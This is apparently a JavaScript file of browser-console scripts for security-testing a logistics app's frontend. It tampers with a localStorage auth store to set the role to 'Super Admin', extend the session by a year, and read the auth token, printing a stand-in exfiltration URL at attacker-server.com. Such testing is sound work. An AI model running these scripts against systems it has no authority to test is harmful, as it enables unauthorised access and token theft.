/**
 * Logic-based "Attack" Scripts for Logistics App Frontend Security Testing
 * 
 * Instructions:
 * 1. Open your browser's Developer Tools (F12 or Ctrl+Shift+I).
 * 2. Go to the "Console" tab.
 * 3. Copy and paste the desired script below and press Enter.
 */

// --- ATTACK 1: PRIVILEGE ESCALATION (Role Manipulation) ---
// Goal: Gain "Super Admin" access by modifying the local state.
// Note: This bypasses frontend route protection. Backend validation should still occur.
(function() {
    const STORAGE_KEY = 'dara-auth-store';
    const rawData = localStorage.getItem(STORAGE_KEY);
    
    if (!rawData) {
        console.error("[-] No auth store found in localStorage. Are you logged in?");
        return;
    }

    try {
        const store = JSON.parse(rawData);
        if (!store.state || !store.state.user) {
            console.error("[-] User data not found in store.");
            return;
        }

        console.log("[+] Original Role:", store.state.user.role);
        
        // Manipulate the role
        store.state.user.role = 'Super Admin';
        store.state.isAuthenticated = true;
        
        // Save back to localStorage
        localStorage.setItem(STORAGE_KEY, JSON.stringify(store));
        
        console.log("[!] ROLE ELEVATED TO 'Super Admin'. Refresh the page to see administrative routes.");
        console.log("[!] Try navigating to /dashboard or /settings now.");
    } catch (e) {
        console.error("[-] Failed to parse store:", e);
    }
})();


// --- ATTACK 2: TOKEN EXFILTRATION (XSS Simulation) ---
// Goal: Stealthily read the authentication token to send it to a remote server.
(function() {
    const STORAGE_KEY = 'dara-auth-store';
    const rawData = localStorage.getItem(STORAGE_KEY);
    
    if (rawData) {
        const store = JSON.parse(rawData);
        const token = store.state?.token;
        
        if (token) {
            console.warn("[!] XSS SUCCESS: Token Intercepted!");
            console.log("[!] Token:", token);
            console.log("[!] In a real attack, this token would now be sent to: https://attacker-server.com/steal?token=" + btoa(token));
        } else {
            console.log("[-] No token found in store.");
        }
    }
})();


// --- ATTACK 3: SESSION PERSISTENCE HIJACKING ---
// Goal: Stay "logged in" on the frontend even after the session should have expired.
(function() {
    const STORAGE_KEY = 'dara-auth-store';
    const rawData = localStorage.getItem(STORAGE_KEY);
    
    if (rawData) {
        const store = JSON.parse(rawData);
        
        // Set expiration to 1 year in the future
        const oneYear = 365 * 24 * 60 * 60 * 1000;
        store.state.sessionExpiresAt = Date.now() + oneYear;
        
        localStorage.setItem(STORAGE_KEY, JSON.stringify(store));
        console.log("[+] SESSION EXTENDED: Frontend session now expires in 1 year.");
    }
})();
